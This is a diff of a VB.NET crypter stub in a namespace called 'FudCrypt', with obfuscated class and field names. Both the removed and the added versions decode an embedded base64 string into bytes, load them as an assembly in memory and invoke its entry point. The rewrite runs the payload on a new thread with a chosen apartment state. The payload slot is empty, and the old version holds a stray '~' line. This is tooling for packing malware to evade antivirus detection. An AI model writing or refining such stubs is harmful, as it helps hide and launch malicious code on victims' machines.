@@ -1,38 +1,48 @@
-Imports System.Security.Cryptography
-Imports System.IO
-Imports System.Web
-Imports System.Text
 Imports System
-Imports Microsoft.VisualBasic
 Imports System.Reflection
-Imports System.Runtime.InteropServices
-Imports Microsoft.Win32
-Imports System.Net
-Imports System.Windows
-Imports System.Windows.Forms
-Imports System.IO.Compression
-Imports System.Diagnostics
-Imports System.Collections
-Imports System.Collections.Generic
 Imports System.Threading
-Imports System.Security.AccessControl
-Imports System.ComponentModel
-Imports System.Security.Principal
-Imports System.Globalization
-Module OcYjzPUtJkNbLOABqYvNbvhZf 
-Dim gwiXxyIDDtoYzgMSRGMckRbJi As String = ""
-Sub Main()	
-	~
-	Dim variable_array() As Object = New System.Object()
-	variable_array(0) = {"0"}
-	Try
-		System.Threading.Thread.GetDomain.Load(Decode(gwiXxyIDDtoYzgMSRGMckRbJi)).EntryPoint.Invoke(0, variable_array)
-	Catch ex As Exception
-		MessageBox.Show(ex.GetBaseException().ToString())
-	End Try
-End Sub
-Public Function Decode(ByVal Data As String) As Byte()
-	Dim variable_bytes As Byte() = HttpServerUtility.UrlTokenDecode(Data)
-	return variable_bytes
-End Function
-End Module
+Imports System.Web
+
+Namespace FudCrypt
+
+    Public Class OcYjzPUtJkNbLOABqYvNbvhZf
+
+        Shared gwiXxyIDDtoYzgMSRGMckRbJi As String = ""
+
+        <STAThread>
+        Private Shared Sub Main(ByVal args As String())
+            Dim assemblyParameters As Object() = New Object(0) {}
+            Dim unloadedAssembly As Byte() = New Byte() {}
+            Dim loadedAssembly As Assembly = Nothing
+            Try
+                loadedAssembly = Thread.GetDomain().Load(unloadedAssembly)
+            Catch badImageFormatException As BadImageFormatException
+                Console.WriteLine("Image is not managed")
+            End Try
+
+            If loadedAssembly Is Nothing Then Return
+            Try
+                Dim threadState As ApartmentState = ApartmentState.Unknown
+                If loadedAssembly.EntryPoint.GetParameters().Length > 0 Then
+                    assemblyParameters(0) = New String() {Nothing}
+                    threadState = ApartmentState.STA
+                Else
+                    assemblyParameters(0) = Nothing
+                    threadState = ApartmentState.MTA
+                End If
+
+                Dim assemblyThread As Thread = New Thread(Sub()
+                    loadedAssembly.EntryPoint.Invoke(Nothing, assemblyParameters)
+                End Sub)
+                assemblyThread.SetApartmentState(threadState)
+                assemblyThread.Start()
+            Catch invocationException As TargetInvocationException
+                Console.WriteLine("An error has occured")
+            End Try
+        End Sub
+
+        Public Shared Function Decode(ByVal data As String) As Byte()
+            Return HttpServerUtility.UrlTokenDecode(data)
+        End Function
+    End Class
+End Namespace
